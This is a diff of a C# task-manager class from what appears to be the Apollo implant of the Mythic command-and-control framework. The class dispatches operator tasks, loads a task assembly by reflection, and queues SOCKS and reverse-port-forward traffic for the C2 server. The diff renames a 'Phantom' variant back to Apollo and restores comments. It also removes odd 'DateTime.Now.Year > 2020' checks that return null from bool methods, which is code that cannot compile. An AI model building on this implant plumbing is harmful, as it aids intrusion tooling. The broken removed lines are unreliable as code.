@@ -2,26 +2,26 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Collections.Concurrent;
-using PhantomInterop.Interfaces;
-using PhantomInterop.Types.Delegates;
-using PhantomInterop.Structs.MythicStructs;
-using PhantomInterop.Enums.PhantomEnums;
-using PhantomInterop.Classes;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Types.Delegates;
+using ApolloInterop.Structs.MythicStructs;
+using ApolloInterop.Enums.ApolloEnums;
+using ApolloInterop.Classes;
 using System.Threading;
 using  System.Threading.Tasks;
 using System.Reflection;
-using PhantomInterop.Classes.Collections;
-using PhantomInterop.Utils;
+using ApolloInterop.Classes.Collections;
+using ApolloInterop.Utils;
 
-namespace Phantom.Management.Tasks
+namespace Apollo.Management.Tasks
 {
-    public class CommandProcessor : ITaskManager
+    public class TaskManager : ITaskManager
     {
         protected IAgent _agent;
 
         private ThreadSafeList<MythicTaskResponse> TaskResponseList = new();
         private ThreadSafeList<DelegateMessage> DelegateMessages = new();
-        
+        //private ConcurrentQueue<DelegateMessage> DelegateMessages = new ConcurrentQueue<DelegateMessage>();
 
         private Dictionary<MessageDirection, ConcurrentQueue<SocksDatagram>> SocksDatagramQueue = new()
         {
@@ -44,7 +44,7 @@ namespace Phantom.Management.Tasks
         private Task _mainworker;
         private Assembly _tasksAsm = null;
 
-        public CommandProcessor(IAgent agent)
+        public TaskManager(IAgent agent)
         {
             _agent = agent;
             InitializeTaskLibrary();
@@ -72,13 +72,13 @@ namespace Phantom.Management.Tasks
                                     _loadedTaskTypes[result.Command],
                                     new object[] {_agent, result});
                                 var taskObj = t.CreateTasking();
-                                
+                                // When the task finishes, we remove it from the queue.
                                 taskObj.ContinueWith((_) => { _runningTasks.TryRemove(t.ID(), out Tasking _); });
-                                
+                                // Unhandled exception occurred in task, report it.
                                 taskObj.ContinueWith((_) => { OnTaskErrorOrCancel(t, taskObj); },
                                     System.Threading.Tasks.TaskContinuationOptions.OnlyOnFaulted);
-                                
-                                
+                                // If it got cancelled and threw an exception of that type,
+                                // report it.
                                 taskObj.ContinueWith((_) => { OnTaskErrorOrCancel(t, taskObj); },
                                     System.Threading.Tasks.TaskContinuationOptions.OnlyOnCanceled);
                                 _runningTasks.TryAdd(t.ID(), t);
@@ -109,8 +109,8 @@ namespace Phantom.Management.Tasks
 
         private void InitializeTaskLibrary()
         {
-            
-            
+            // Annoying note - if there's an assembly in the Tasks DLL that isn't in the Apollo
+            // reference assemblies, then you'll run into loading errors.
             _tasksAsm = Assembly.Load("Tasks, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
             if (_tasksAsm == null)
             {
@@ -155,7 +155,7 @@ namespace Phantom.Management.Tasks
                 bRet = true;
             }
 
-            if(DateTime.Now.Year > 2020) { return bRet; } else { return null; }
+            return bRet;
         }
 
         private void OnTaskErrorOrCancel(Tasking t, System.Threading.Tasks.Task taskObj)
@@ -250,28 +250,28 @@ namespace Phantom.Management.Tasks
                 }
             }
 
-            if(DateTime.Now.Year > 2020) { return true; } else { return null; }
+            return true;
         }
 
         public bool CreateTaskingMessage(OnResponse<TaskingMessage> onResponse)
         {
-            
-            
+            // We should pop messages from the task manager and stuff them into
+            // this message here.
 
-            
-            
+            //List<TaskResponse> responses = new List<TaskResponse>();
+            //List<DelegateMessage> delegates = new List<DelegateMessage>();
             List<SocksDatagram> dgs = new List<SocksDatagram>();
             List<SocksDatagram> rpfwdDgs = new List<SocksDatagram>();
             List<EdgeNode> edgs = new List<EdgeNode>();
-            
-            
-            
-            
+            //while(TaskResponseQueue.TryDequeue(out TaskResponse res))
+            //{
+            //    responses.Add(res);
+            //}
 
-            
-            
-            
-            
+            //while(DelegateMessages.TryDequeue(out var res))
+            //{
+            //    delegates.Add(res);
+            //}
 
             while(SocksDatagramQueue[MessageDirection.ToMythic].TryDequeue(out var dg))
             {
@@ -293,12 +293,12 @@ namespace Phantom.Management.Tasks
                 Rpfwd = rpfwdDgs.ToArray(),
                 Edges = edgs.ToArray()
             };
-            if(DateTime.Now.Year > 2020) { return onResponse(msg); } else { return null; }
+            return onResponse(msg);
         }
 
         public string[] GetExecutingTaskIds()
         {
-            if(DateTime.Now.Year > 2020) { return _runningTasks.Keys.ToArray(); } else { return null; }
+            return _runningTasks.Keys.ToArray();
         }
 
         public bool CancelTask(string taskId)
@@ -308,14 +308,14 @@ namespace Phantom.Management.Tasks
                 try
                 {
                     t.Kill();
-                    if(DateTime.Now.Year > 2020) { return true; } else { return null; }
+                    return true;
                 } catch
                 {
-                    if(DateTime.Now.Year > 2020) { return false; } else { return null; }
+                    return false;
                 }
             } else
             {
-                if(DateTime.Now.Year > 2020) { return false; } else { return null; }
+                return false;
             }
         }
     }
